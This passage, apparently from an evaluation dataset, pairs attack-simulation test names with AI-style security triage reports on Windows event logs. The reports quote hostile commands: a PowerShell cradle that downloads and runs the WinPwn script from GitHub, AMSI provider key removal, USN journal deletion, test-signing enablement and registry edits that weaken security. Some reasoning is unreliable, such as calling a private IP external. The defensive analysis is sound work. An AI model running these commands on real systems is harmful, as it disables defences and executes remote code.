- **Registry Changes:** Even if the action indicates administrative tasking, it requires validation against change management logs to determine if these registry changes are authorized.
- **System Integrity:** No running of unusual or rogue processes is detected. No clear indication of privilege escalation or lateral movement activities.

2. **Sysmon Logs:**
   - **Process Execution:**
     - Numerous executions of `wevtutil.exe` and `conhost.exe` are observed, driven by the user `SERVER002\admin_test`. These processes are often used for legitimate purposes such as querying event logs, but a pattern of their usage could indicate log tampering.
     - `cmd.exe` is executed with a command modifying the registry key, specifically `""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU""` to set `NoAutoRebootWithLoggedOnUsers`. This type of modification can be legitimate for administrative control over updates but could also indicate an attempt to maintain the system running for further exploitation.
     - `reg.exe` and `cmd.exe` coupled with high integrity level for the same registry modification points to possible manual tampering without administrative approval.
     - Process execution events for `MicrosoftEdgeUpdate.exe` are frequent and legitimate, appearing as part of normal Edge update cycles, initiated by `NT AUTHORITY\SYSTEM`.

3. **Application Logs:**
   - Events show `edgeupdate` services starting and stopping, typical of routine update activities for Microsoft Edge and Microsoft Edge Update.

### Assessment:

- **Suspicious Activity:**
  - The registry modification (`cmd.exe` and `reg.exe`) executed by the user `SERVER002\admin_test` suggests a potential attempt to alter system settings that maintain user environment stability without user reboot, often seen in suspicious activities aiming at persistent access.
  - There is a repeated execution pattern for `wevtutil.exe` under a user-admin context which may denote potential log manipulation efforts.

- **Non-suspicious Activities:**
  - Edge Update processes and associated application logs appear consistent with standard update behavior and do not signify any immediate threats.

### Conclusion:
- **Resolution: SUSPICIOUS**
  - The registry modification executed by high integrity processes and the pattern of `wevtutil.exe` execution warrant further investigation. These activities could indicate preparatory steps for maintaining or escalating access or attempting to cover tracks.
  
### Recommended Actions:
1. **Investigate the Purpose of Registry Modifications:**
   - Confirm if these changes were authorized for legitimate administrative purposes or if they signify an unauthorized configuration change.
   
2. **Review User Activity:**

Windows HideSCANetwork Group Policy Feature,"Upon analyzing the provided Windows event logs, particularly the Sysmon logs, several points stand out that could indicate suspicious activity:

1. **Frequent Execution of System Utilities:**
   - There are multiple instances of `whoami.exe`, `wevtutil.exe`, and `cmd.exe` being executed. While these are legitimate system utilities, their frequent usage close to each other can suggest an automated script or manual intervention for reconnaissance or system modification.
  
2. **Registry Modification:**
   - A `cmd.exe` process is executed with a command line to modify the registry: `reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCANetwork /t REG_DWORD /d 1 /f`. This activity indicates a change in user policy settings to potentially hide network configurations, which is often associated with persistence techniques used by adversaries.

3. **Edge Update Executions:**
   - Multiple events involve `MicrosoftEdgeUpdate.exe` and associated components being executed repeatedly. However, given that these are from a legitimate Microsoft application, in isolation, they might be benign. Nevertheless, it's unusual for updates to spawn rapidly across several executions unless there's troubleshooting or a repeated install occurring, which should be verified for end-user activity.

4. **High Integrity Levels and System User Context:**
   - Processes are running under high integrity levels and using the `NT AUTHORITY\SYSTEM` user, indicating they have significant privileges. This could be standard for a legitimate updater, but combined with the registry manipulation and tool executions, it may warrant further scrutiny.

5. **Use of `conhost.exe`:**
   - `conhost.exe` appears frequently, corresponding with other processes like `cmd.exe` and `whoami.exe`. While not inherently suspicious, frequent and rapid spawning can sometimes indicate command line activities via scripts or exploits.

### Assessment
The pattern of activity observed can be characterized as **SUSPICIOUS** due to the following:
- The frequent execution of system utilities which can be indicative of reconnaissance, system enumeration, or attempts to modify system settings.
- Direct registry manipulation aimed at changing user policies.
- The legitimate Edge Update component's involvement in the activity, while suspicious in context with rapid execution, doesn't conclusively indicate compromise but warrants verification.

### Recommended Actions
- **Further Investigation**: Examine whether authorized personnel or applications were performing legitimate updates or tests on `Server002`.
- **Network Monitoring**: Check for any network activities associated with known malicious IPs or unexpected data exfiltration patterns.
- **Integrity Checking**: Validate the integrity and hash values of involved system binaries (`whoami.exe`, `wevtutil.exe`, `cmd.exe`, etc.) to ensure they haven't been tampered with.
- **User Behavior Analysis**: Correlate the timeline with user activity logs or helpdesk tickets to verify if these actions align with user assistance requests or automated maintenance.

If no legitimate justification is identified from these follow-up actions, a more detailed forensic examination may be necessary to rule out compromise definitively."
Execution from Compressed File,"An analysis of the provided Windows event logs indicates the following:

### Suspicious Activity Detected

1. **Suspicious Execution of PowerShell, cmd, and Custom Executable:**
   - Several PowerShell (`powershell.exe`), CMD (`cmd.exe`), and Custom Executable (`data.exe`) executions were noted by the user `SERVER002\admin_test`. PowerShell is often used by attackers for various purposes, including script execution, reconnaissance, or payload delivery, especially when there is no context about its intended use.
   - The execution of `cmd.exe` with a command line that includes `""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\temp_data.zip\data.exe""` seems particularly suspicious. This indicates an attempt to execute an executable from a temporary directory, which is a common technique employed in malicious activities to obfuscate actions.
   - The file `data.exe` being executed without a known file version or description further adds to the suspicion.

2. **Chain Execution:**
   - There is a chain of process executions starting from `cmd.exe`, leading to the execution of `data.exe`, and finally spawning `calc.exe`. While `calc.exe` itself is not harmful, its execution here could be a decoy to mislead potential investigation efforts or a technique to test execution privileges. This chain suggests potential execution of unwanted or malicious scripts/executables.

### Other Observations

- **Credential Access Events:**
  - Multiple Security Audit Failures (Event ID 5379) involving credential accesses with an unspecified target name (`02txoixylodcstop`) return a failure code, which may indicate possible failures in attempts to retrieve sensitive credentials. However, this remains inconclusive without more context about the application or process performing these operations.

- **Legitimate System Activity:**
  - Activities such as updates (`Microsoft Edge`, `Defender updates`), and regular system operations (e.g., `wuauclt.exe`, `MpSigStub.exe`) appear to be part of standard system processes and updates, as per the logs provided. These do not indicate any malicious activity.

### Assessment

Given the evidence presented, especially the command execution from temporary directories and the use of non-standard executables coupled with PowerShell and CMD line executions, the logs present sufficient indications to label this activity as **SUSPICIOUS**.

### Resolution and Guidance

**Resolution:** SUSPICIOUS

**Guidance:**
- **Immediate Further Investigation:** Analyze the contents of the file `data.exe`. This should include hash verification, sandbox analysis, and comparison with known malware signatures.
- **Review PowerShell Logs:** Collect and review detailed PowerShell logs and command history used during the same time frame for deeper insights.
- **User Access and Activity:** Verify recent activities and access patterns of the user account `SERVER002\admin_test` for any irregularities or unauthorized access.
- **Implement Monitoring and Restrictions:** Set up alerts for executions from the temp directory and unusual PowerShell activities. Implement execution restrictions for unknown binaries and scripts where possible.
- **Check for Persistence Mechanisms:** Inspect the system for possible persistence mechanisms such as scheduled tasks or autorun entries that may have been installed by malicious scripts.

Following these steps will help ascertain the nature of the activity and mitigate any potential threats."
Invoke HTML Application - JScript Engine with Inline Protocol Handler,"Based on the provided logs, I have conducted a thorough analysis to identify any potential indicators of malicious activity. Here's the breakdown of findings:

1. **PowerShell Activity**:  
   - There is a suspicious PowerShell invocation with the command: `powershell.exe & {Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\system32\mshta.exe}`. 
   - The use of `mshta.exe` in conjunction with script engines is often seen in malicious activities, as `mshta.exe` can execute HTML scripts and has been used in various cyber-attacks for obfuscation and to bypass security controls.

2. **Frequent Use of System Tools**:  
   - Several executions of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` are observed, which are legitimate system processes. While these can be part of normal administrative operations, their frequent and clustered appearance alongside suspicious PowerShell activity raises concerns. `wevtutil.exe` has been used in attacks to clear or enumerate logs.
   - The presence of `wsmprovhost.exe` as a parent process indicates that Windows Remote Management (WinRM) is involved, which can be legitimate but could also be used for lateral movement if not properly secured.

3. **Edge Update and Setup Executions**:  
   - The logs show multiple executions related to updating Microsoft Edge. While such updates are common and typically benign, combined with the peculiar PowerShell usage, it's worth further examination to ensure these are legitimate updates and not being spoofed or manipulated for malicious intent.

4. **High-Integrity and SYSTEM-Level Operations**:  
   - Many operations are running with high integrity and under the `NT AUTHORITY\SYSTEM` account, which is typical in updates and system tasks but could imply elevated privileges being leveraged for potentially malicious actions.

### Assessment:

- **PowerShell and `mshta.exe` Integration**: Highly suspicious given common malware tactics of using these tools to execute scripts.
- **Pattern of Tool Usage**: While individual instances might be benign, together with the PowerShell activity, they suggest possible reconnaissance or preparation steps for a potential attack.

### Recommendation:

- Further investigation is required, particularly into the PowerShell command's origin, intent, and whether it was a legitimate operation.
- Review recent Edge updates to confirm legitimacy.
- Monitor for any unauthorized use of remote administration tools and ensure all critical data and systems are backed up and prepared for further containment actions if necessary.
  
**Resolution**: SUSPICIOUS - The behaviors noted particularly with PowerShell, `mshta.exe`, and frequent system tool usage warrant further investigation to determine whether these actions are aligned with standard operations or if they are indicative of a potential compromise."
WinPwn - Kill the event log services for stealth,"### Detailed Analysis

Upon analyzing the provided Windows event logs, several suspicious activities have been identified, particularly concerning PowerShell usage:

1. **Suspicious PowerShell Execution**:
   - The Sysmon and Windows PowerShell logs show an execution of `powershell.exe` with a command-line invocation of a script from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). Invoking PowerShell to download and execute scripts from external sources is a known tactic used by malicious actors to execute potentially harmful code remotely.
   - The command includes an execution method (`iex(new-object net.webclient).downloadstring(...)`) that is commonly associated with attempts to download and execute scripts in memory, which can be used to avoid detection by traditional antivirus software.

2. **High-Integrity PowerShell Session**:
   - The PowerShell script was executed under a `High` integrity level suggesting that it was run with elevated privileges, further increasing the potential for system impact if the script was indeed malicious.

3. **Multiple Instances of Service and Command Executions**:
   - Event logs include several instances of Microsoft Edge and related service executions, frequent stops and starts typical of updates, yet these alone do not seem inherently malicious, especially considering the routine service noise and the use of `NT AUTHORITY\SYSTEM` which is common for system-related services.
   
4. **Processes Executed by `SERVER002\admin_test` Account**:
   - Several processes (`wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`) were executed by the user account `SERVER002\admin_test`. Though some of these processes are typical system utilities, their repeated rapid invocation suggests potential scripting or automated task activity by this account, which is worth investigating to understand the intent.

### Assessment

The observed PowerShell activity, characterized by the remote script execution and its integration with GitHub-hosted scripts, is highly suggestive of unauthorized or potentially malicious activity. This behavior closely aligns with tactics used in penetration testing frameworks or during an actual breach where an attacker may attempt to gather information, elevate privileges, or establish persistence.

Additionally, the high-integrity execution context further raises alarms about the potential impact of this activity.

**Resolution: MALICIOUS**

### Recommendations and Guidance

- **Immediate Incident Response**: Given the presence of what appears to be unauthorized script execution with high privileges, initiate an incident response process to contain and remediate any potential threat.
- **Investigate Account Usage**: Review the activities of the user account `SERVER002\admin_test`, including logins, access patterns, and any other processes initiated by this account around the same time.
- **Network and Endpoint Monitoring**: Increase monitoring of network traffic to and from external repositories, particularly GitHub. Enhance endpoint detection rules for PowerShell executions that involve remote downloads or script execution from memory.
- **Security Harden Windows Hosts**: Implement security controls to restrict PowerShell usage, such as enabling constrained language mode, deploying AppLocker or Windows Defender Application Control policies to restrict script execution, and requiring just-in-time administrative access.
- **Conduct a Systems and Network Audit**: Evaluate other systems for similar patterns of behavior to identify additional potentially impacted systems or other ongoing unauthorized activities.

These steps aim to both mitigate the immediate risk and strengthen the security posture against similar future incidents."
AMSI Bypass - Remove AMSI Provider Reg Key,"Upon reviewing the provided logs, several key observations and analyses can be made:

1. **PowerShell Usage**:
   - The logs show the execution of a PowerShell command: `powershell.exe & {Remove-Item -Path \""HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\"" -Recurse}`.
   - This command attempts to remove a registry key related to AMSI (Antimalware Scan Interface) providers, which is often associated with attempts to disable or interfere with Windows Defender or other security software. This is considered a red flag, as AMSI tampering can indicate attempts to evade detection by malware.

2. **EDR Alert**:
   - The alert on the CEO's machine is noteworthy, and the suspicious PowerShell activity could be a part of this alert, signifying an active attempt to compromise system defenses.

3. **System and Application Logs**:
   - There are system and application logs indicating service stops and general system activities; however, they align with typical background processes and do not indicate direct threats alone. However, the context of these logs in conjunction with the PowerShell activity could suggest a larger issue at play.

4. **Sysmon Logs**:
   - The Sysmon logs detail processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and repeated executions of `MicrosoftEdgeUpdate.exe`, among others. These are legitimate processes, but when combined with other suspicious activities such as the PowerShell execution, they could indicate malicious use.
   - The presence of `wevtutil.exe` processes could be leveraged to clear event logs or for other administrative actions, and should be reviewed in context.

5. **Security Logs**:
   - Security logs indicate changes in time events and service-related activities. Such logs could point to unauthorized temporal changes, but within the context provided, this seems part of regular system adjustments rather than malicious resets.

**Assessment**:
- Given the information and the nature of the PowerShell command detected, there is a clear sign of potentially malicious activity aimed at disabling security measures within the system. The combination of attempted registry changes targeting AMSI and other system-related processes suggests a coordinated effort possibly indicative of a compromise or prelude to further intrusive activities.

**Resolution**:
- **MALICIOUS**: The logs contain activity that is highly indicative of malicious intent, particularly the PowerShell command designed to remove antimalware protection components.

**Guidance**:
- Immediate steps should be taken to isolate the system to prevent any further potential spread or damage.
- Conduct a comprehensive malware scan using updated definitions and consider a full audit of similar command executions across the network.
- Review and harden Group Policies to prevent unauthorized script execution and registry modifications.
- Notify relevant stakeholders and prepare for incident response protocols, including potential forensic analysis of the affected system to identify any further persistence mechanisms or indicators of compromise."
Adding custom paths for application execution,"### Analysis of the Provided Logs

#### **Sysmon Logs**

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - The logs show multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. The `wevtutil.exe` is a legitimate tool used to read and manage event logs, while `conhost.exe` is a console window host process.
   - Frequent execution of `wevtutil.exe` could be performed for log management purposes, but it is also a tool that attackers might exploit to delete or export logs to cover tracks.

2. **Unusual Registry Modification via `cmd.exe` and `reg.exe`:**
   - The command `""cmd.exe"" /c reg add ""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe"" /t REG_SZ /d C:\\Windows\\System32\\notepad.exe /f` indicates an attempt to modify the registry to associate `msedge.exe` with `notepad.exe`. This is highly suspicious as it can be used to redirect legitimate application calls to a different executable, possibly as part of an attack.

3. **Use of Basic System Tools like `hostname.exe`, `whoami.exe`:**
   - There is evidence of typical command-line tools like `hostname.exe` and `whoami.exe` being executed. These are often used by attackers to gather information about the system.

#### **Security Logs**

1. **Elevated Privileges:**
   - EventID 4672 shows the `admin_test` user acquired several high-level privileges, including `SeDebugPrivilege`, which can be used for debugging and accessing sensitive information. This is a sign of potential privilege escalation.

2. **Remote Logon (EventID 4624):**
   - The log shows a logon type of 3 (network logon) using NTLM, originating from IP address `192.168.0.102`. This could be legitimate but warrants further investigation to rule out unauthorized access.

#### **Application Logs**

- The `edgeupdate` application logs indicate a service being stopped. Although stopping a service can be part of normal operations, it could also be done to disrupt legitimate processes as part of an attack.

### Assessment

Based on the analysis of these logs, there are several indicators of suspicious activity that needs further investigation:

1. **Registry Manipulation**: The alteration of app paths in the registry to reroute an application to execute another is commonly seen in misdirection attacks.
   
2. **Privilege Escalation**: The `admin_test` account has received elevated permissions that might indicate privilege escalation.

3. **Use of Potentially Exploitable Tools**: Frequent execution of `wevtutil.exe` could signify attempts to manipulate event logs to hide other activities.

4. **Remote Network Logon**: The incoming network connection using NTLM from a specific IP should be verified to ensure it is legitimate.

### Guidance on How to Proceed

- **Investigate the Registry Changes**: Validate why the registry was altered and whether `msedge.exe` (Microsoft Edge) is being redirected intentionally or maliciously.

- **Check Remote Logon Source**: Verify the owner and purpose of the IP address `192.168.0.102` for the network logon instance.

- **Audit Privileged Accounts**: Review the actions performed by the `admin_test` account, especially given the elevated privileges.

- **Monitor Application Behavior**: Ensure continued monitoring of logs and processes on this host to catch any further suspicious changes.

### Resolution

Based on the findings, the resolution is:

- **SUSPICIOUS** - The activity, especially the registry modification and privilege escalation, doesn't look right and needs more investigation. Further scrutiny should help determine if actions are malicious or part of legitimate administrative tasks."
Modify EnableBDEWithNoTPM Registry entry,"**Detailed Analysis of the Logs:**

Upon reviewing the provided logs, several points stand out and warrant further investigation:

1. **Suspicious Process Execution with Reg.exe and Cmd.exe:**
   - The Sysmon logs show execution of `cmd.exe` with command line arguments involving registry edits. Specifically, `cmd.exe` runs with the command: `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f`. This indicates an attempt to modify BitLocker settings to enable encryption without a Trusted Platform Module (TPM), which is an uncommon and potentially suspicious action unless performed by a legitimate administrator under known circumstances.

2. **Consecutive Launches of `wevtutil.exe` and `conhost.exe`:**
   - The frequent execution of `wevtutil.exe` and `conhost.exe` by the `SERVER002\admin_test` user, particularly under administrative privileges, could suggest activity aimed at event log manipulation or viewing, which could be used to cover tracks after a malicious operation.

3. **Process Execution under High Integrity Level:**
   - Processes such as `hostname.exe`, `whoami.exe`, and `cmd.exe` are executed under high integrity levels, likely by the same `admin_test` user. While not inherently suspicious, it combines with the modification of registry keys as potentially illicit activity.

4. **Edge Update Activities:**
   - Several events indicate activities related to `MicrosoftEdgeUpdate.exe`. Although update processes are regular, the instantiation from a temporary directory (`C:\Program Files (x86)\Microsoft\Temp\`) and repeated calls for service installations and component registrations seem excessive. This could suggest misuse of the update framework or an attempt to blend in with legitimate traffic for conducting other activities.

**Assessment:**

- **SUSPICIOUS**: The activities around registry modification to control BitLocker behavior, along with frequent executions of utility processes under administrative user space, seem out of the norm, especially if the context for these actions isn't from verified IT operations. Use of these tools outside routine tasks could point to potential privilege escalation or preparation steps for data exfiltration or broader system compromise efforts.

**Threats or Risks Identified:**

- **Potential unauthorized modification** of security settings could weaken system defenses.
- **Possible event log manipulation** suggests attempts at anti-forensics by hiding tracks.
- **Window of Exposure**: High integrity process execution without apparent justification risks unauthorized control and information theft.

**Guidance on How to Proceed:**

- **Immediate Verification**: Confirm the identity and actions of the `SERVER002\admin_test` user. Ensure that all actions are authorized and expected.
- **Review Group Policies**: Check any existing administrative policies or activities that might involve registry edits or BitLocker modifications.
- **Audit System Changes**: Look for parallel evidence that corroborates legitimate change activity against BitLocker or the system in general.
- **Capture and Preserve Logs**: Secure the logs from further modification and enhance monitoring for any new suspicious activities.
- **Engage with IT or Internal Security Team**: Depending on outcomes of immediate checks, engage further actions such as isolating systems or alerting internal security professionals for a controlled investigation. 

In conclusion, while the behavior noted in the logs isn't definitively malicious, the nature of the actions suggest a need for deeper investigation. The resolution at this stage stands as **SUSPICIOUS**."
Code Signing Policy Modification,"Upon reviewing the provided logs from the Windows system, there are several observations that stand out:

1. **Time Changes**: There are multiple entries in the System log where the system time was changed in quick succession. This is typically seen when the Windows Time Service synchronizes with an NTP server (such as ""time.windows.com""). While time changes can be legitimate, the frequency and pattern of these changes could be investigated further, though currently, they appear to be a result of normal system operation (`svchost.exe` managing time synchronization).

2. **Process Activities (Sysmon Logs)**: 
   - The `wevtutil.exe` and `conhost.exe` processes are repeatedly launched by the `SERVER002\admin_test` user. `wevtutil.exe` is used to manage event logs, and `conhost.exe` is a Console Window Host. Such repetitive spawning in a short span of time can ordinarily suggest scripted or automated actions, but without more context, the activities themselves aren't inherently malicious.
   - The execution of `cmd.exe` to run the command `bcdedit /set testsigning on` is suspicious. This command enables test signing mode, which allows drivers that are not signed by recognized authorities to run on the system. This could be an attempt to allow unauthorized or potentially malicious drivers to operate.

3. **Microsoft Edge Update**: The sequence of events related to `MicrosoftEdgeUpdate.exe` and its subprocesses appears consistent with an update process for Microsoft Edge. The presence of expected metadata attributes such as proper file hashes, vendors, and expected directories generally suggest benign activities related to a software update.

4. **Security Logs**: The `Security` log entries that record time changes align with the System logs and do not directly indicate privilege escalation or unauthorized access.

**Assessment**:
- The `bcdedit /set testsigning on` command, along with the use of high-level integrity contexts (admin privileges), indicates suspicious behavior that could facilitate unauthorized changes to system files or allow the loading of unsigned drivers, potentially exposing the system to exploitation.

Based on the analysis, the situation requires further investigation to ensure there was not unauthorized usage or alteration of system settings:

- Verify the context and necessity of enabling test signing mode with the system admin (`SERVER002\admin_test`) or through audit logs.
- Ensure virus/malware scans are up-to-date and ensure no unsigned drivers loaded onto the system are malicious.
- Confirm that Microsoft Edge updates were legitimate and cross-verify with Microsoft's update logs.
  
**Resolution**: SUSPICIOUS - The activities warrant further investigation, particularly focusing on the use of test signing mode."
Indicator Removal using FSUtil,"Upon analyzing the provided logs, several patterns and events suggest potentially suspicious activities that warrant further investigation. Here are the key observations:

1. **Repeated Use of `wevtutil.exe`:** 
   - `wevtutil.exe` process appears multiple times executed by `SERVER002\\admin_test`. This utility is commonly used to export, archive, and clear event logs. Although it can be used for legitimate purposes, its repeated execution, especially without clear administrative intentions or logs indicating configuration changes, is suspicious as it might be used by attackers to cover their tracks.

2. **FSUtil Journal Deletion:**
   - Execution of the command `fsutil usn deletejournal /D C:` by `cmd.exe` is highly suspicious. This command deletes the change journal, which is often used by attackers to hide any traces of changes made to the file system after malicious activity.

3. **Unusual Logon Activity:**
   - There are multiple logon events with Event ID 4624 where the `LogonType` is `5`, indicating a service logon. While this is not uncommon, the frequency and timing suggest a need to verify if these services are expected or known.
   - Repeated enumeration of local accounts (`Event ID 4798`) by `taskhostw.exe` is noted. This could be indicative of reconnaissance in preparation for lateral movement or privilege escalation.

4. **Multiple Privileged Operations:**
   - Event ID 4672 indicates that accounts have been granted a set of highly privileged rights such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. Continuous monitoring or verification is required ensuring these operations are legitimate and necessary for running services.

### Assessment:
Considering the observations, the presence of `wevtutil.exe` commands, deletion of USN journal, and excessive privileged operations suggest activities that align with potential malicious intent, especially within the context of an EDR alert on the CEO’s machine.

### Conclusion:
- **Resolution: SUSPICIOUS**

### Guidance on How to Proceed:
1. **Immediate Incident Response:**
   - Isolate the affected system to limit potential lateral movement.
   - Conduct forensic analysis to determine the scope of the compromise and assess all machines that may have interacted with this host.

2. **Log Review and Monitoring:**
   - Review logs for evidence of similar behaviors on other critical systems.
   - Implement additional monitoring for processes like `wevtutil.exe`, `fsutil`, and other administrative utilities to spot misuse.
   
3. **Security Measure Reinforcement:**
   - Verify user account activities and audit permissions, ensuring least privilege principles are adhered to.
   - Implement security hardening measures such as disabling unnecessary services and auditing policies for sensitive operations.
   
4. **Review and Strengthen Controls:**
   - Ensure that logging and alerting mechanisms are capable of detecting unusual patterns indicative of privilege escalation or file deletion commands.

5. **Conduct a Security Review of EDR:**
   - Validate the configurations and rules of the EDR tool to ensure it can effectively identify and alert upon suspicious activities signaled in these logs."
Disable Remote Desktop Security Settings Through Registry,"Based on the examination of the provided Windows event logs, several observations stand out, which could potentially indicate suspicious or malicious activity:

1. **Time Manipulation:** The logs reveal multiple instances of the Event ID 4616, which indicates a system time change. In the security log, the changes to the system time (Event IDs 30360 and 30361) are occurring on the same time stamp, with the 'PreviousTime' being in the future compared to 'NewTime'. This kind of behavior can be indicative of time-based attacks, like log tampering or attempts to evade detections based on time stamps.

2. **High Privilege Logon:** Event ID 4672 shows that the user ""admin_test"" on SERVER002 was granted special privileges shortly after logging in (Event ID 4624). These privileges include potentially dangerous ones like SeDebugPrivilege, which could be indicative of attempts for privilege escalation or detailed system inspection by unauthorized users.

3. **Regedit Activity:** The Sysmon logs (Event ID 1) indicate that a highly privileged process `cmd.exe` executed a command to modify the registry key `HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services\DisableSecuritySettings`. This change was performed using the `reg.exe` utility. Such changes can potentially disable security settings and indicate the attempt to alter Terminal Services settings, which might be a part of lateral movement tactics or persistence mechanisms.

4. **Use of System Utilities:** There are multiple instances of administrative and system tools being used, including `wevtutil.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, `reg.exe`, and even network-related utilities from external IPs. While these can be used legitimately, their usage in the observed sequence, especially following a high-privilege logon, raises flags about unsanctioned changes or information gathering.

5. **Logon from External IP Address:** The login (Event ID 4624) for user ""admin_test"" specifies an external IP address `192.168.0.102`. Although it is a private IP, the associated logon type (3 - Network) together with the NTLM authentication suggests a network-based login, possibly indicating remote access which might not be typical for a high-privilege account.

In conclusion, the combination of these elements suggests that these events are more than routine administrative activities. The modification of system security settings via registry, changes to system time, and potential remote access by a privileged account are strong indicators of suspicious activity.

**Resolution: SUSPICIOUS**

Further investigation is necessary to confirm whether these actions were authorized or part of a malicious intrusion:
- Verify with the user ""admin_test"" or their supervisor about their recent activities.
- Perform a deeper forensic analysis on the host for corresponding unauthorized changes.
- Examine network logs for unusual connection patterns from ""192.168.0.102"" and other connected devices.
- Review any recent alerts or logs related to account misuse or privilege escalation."
WINWORD Remote Template Injection,"**Analysis of the Logs:**

1. **Application Log:**
   - The log entry here is from the ""Software Protection Platform Service"" which is a common Windows service responsible for license management. The entry does not indicate any immediate suspicious behavior.

2. **Security Log:**
   - Events with EventID 4616 indicate system time changes, which are logged by Windows for audit purposes. In a security context, frequent or unauthorized time changes on a critical machine like a CEO’s could raise concerns, but there is no direct indication of malicious intent from these entries alone as they show changes performed by the ""LOCAL SERVICE"". Multiple adjustments within seconds suggest synchronization rather than anomaly.

3. **Sysmon Log:**
   - A significant number of process creations are noted on C:\Windows\System32 and involve well-known Windows binaries: `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, and `HOSTNAME.EXE`.
   - **`wevtutil.exe`**: Commonly used for managing event logs but could potentially be used in information gathering or log cleaning in suspicious cases.
   - **`conhost.exe`**: A normal windows component often leveraged by legitimate processes.
   - **`cmd.exe`**: A command was executed opening a Word document ""Calculator.docx"" from a TEMP folder which can be indicative of a possible spear-phishing attempt if the document was malicious.
   - The presence of **`whoami.exe`**, often used to gather information about the current user context, might be normal but could be leveraged by malicious actors for privilege discovery.
   - The command line for **`cmd.exe`** indicates a `cmd /c start` command which can be used for executing external documents or scripts. The use of this command to potentially open a document in a TEMP folder might be worth further investigation.

4. **System Log:**
   - Again, time changes are recorded, consistent with the security log. These entries involve the time service and **`svchost.exe`**. Normally, svchost runs as a generic host process for services that run from dynamic-link libraries, but on its own, does not indicate malicious behavior.

**Assessment of the Situation:**

- The logs don't display clear signs of a known attack, such as scripts or executables typically used in known malware or intrusion cases.
- The existence of processes like `whoami.exe` and command execution from temporary locations such as the opening of ""Calculator.docx"" with a command could hint at exploratory or preparatory activity (e.g., spear-phishing).
- The multiple execution of legitimate system tools could either be benign administrative tasks or part of a tactic to gather system information quietly.

**Guidance on How to Proceed:**

1. **Deeper Investigation:** Conduct a thorough investigation into the origin and creation of the ""Calculator.docx"". Ensure it hasn’t been modified to carry malicious macros or payloads.
   
2. **Monitor System:** Increase monitoring of this host for anomalous spikes, especially around user credentials activity, elevation attempts, or network-related behavior that could signal exfiltration or further lateral movement attempts.

3. **Threat Hunt:** Conduct a retrospective threat hunt in relation to this behavior pattern across additional logs, including network activity, to check if this activity aligns with internal user behavior or correlates with any external threat intelligence.

4. **User Awareness:** Educate users about the risks of documents from unknown sources, especially if opened from temporary locations, as this could pose phishing or social engineering threats.

**Final Resolution:**

- **SUSPICIOUS** - While there are no concrete evidences of malicious activities, certain behaviors such as the execution of a document from the TEMP directory warrant further investigation to rule out the possibility of underlying malicious intents."
SyncAppvPublishingServer Signed Script PowerShell Command Execution,"### Detailed Analysis of Logs

#### Application Log
1. There are multiple entries indicating that the Windows Defender is active (SECURITY_PRODUCT_STATE_ON), which is typical and expected behavior.
2. There are entries related to the stopping of the `edgeupdate` service which are not inherently suspicious as these are common during updates.

#### Security Log
1. **Event ID 4624**: Indicates a successful logon of the 'SYSTEM' account, which is standard for system operations.
2. **Event ID 4672**: This shows the assignment of special privileges to the 'SYSTEM' account. These include debug and backup privileges, consistent with standard system account permissions.
3. **Event ID 5379**: Consistently shows credential read attempts with a `ReturnCode` of `3221226021`, which translates to ""Credential is not provided."" This does not indicate malicious activity if it pertains to normal account management operations and seems to involve `MicrosoftAccount:user=02txoixylodcstop`.
4. **Event ID 4798**: Lists the membership of security-enabled global groups, which is a standard operation when determining user permissions. 

#### Sysmon Log
1. **Process Execution (Sysmon Event ID 1)**: The execution of `whoami.exe`, `cmd.exe`, and `conhost.exe` by the user `admin_test` under a high integrity level is noted.
   - `whoami.exe` and `hostname.exe` are non-suspicious as they are used for gathering system and user information.
   - The execution of `cmd.exe` with `SyncAppvPublishingServer.vbs` and `Start-Process calc` is atypical. The use of `cmd.exe` to start a calculator process within a script without further context may be considered out of the ordinary.

2. **Use of `wevtutil.exe`**: Several instances of `wevtutil.exe`, a utility used for exporting, archiving, and clearing event logs, executed by `admin_test` are recorded. This could potentially be used to hide tracks, but it also serves administrative purposes.
   
3. **Process Execution Related to Microsoft Edge Updates**: 
   - There are numerous entries of `MicrosoftEdgeUpdate.exe` and related processes (`MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`) indicating updating activities.
   - These entries are reflecting typical update processes conducted by Microsoft's Edge Update service under the `NT AUTHORITY\SYSTEM` account.

#### System Log
1. **Event ID 19**: Records the successful installation of security intelligence updates for Microsoft Defender Antivirus. This shows that the system is receiving security updates and there isn’t anything suspicious about this.

### Assessment

- **Suspicious Activity**: The execution of the `cmd.exe` with arguments for scripting and secondary process initiation (`Start-Process calc`) by the `admin_test` account stands out. Without further context, script-based execution and subsequent launching of applications could imply exploitation attempts or administrative scripts gone unchecked. Similarly, multiple executions of `wevtutil.exe` could be associated with administrative tasks or an attempt to manipulate event logs.

### Resolution

Based on the given log entries, the situation is classified as **SUSPICIOUS**. There are activities, particularly the use of scripting and command-line utilities executed by an administrator account, that warrant further investigation to ensure they are legitimate. While there is no definitive proof of malicious activity, the presence of atypical command-line operations merits closer scrutiny.

### Guidance 

1. **Investigate User Activity**: Verify that the actions performed by `admin_test`, particularly the execution of scripts and command-line processes, are legitimate and sanctioned.
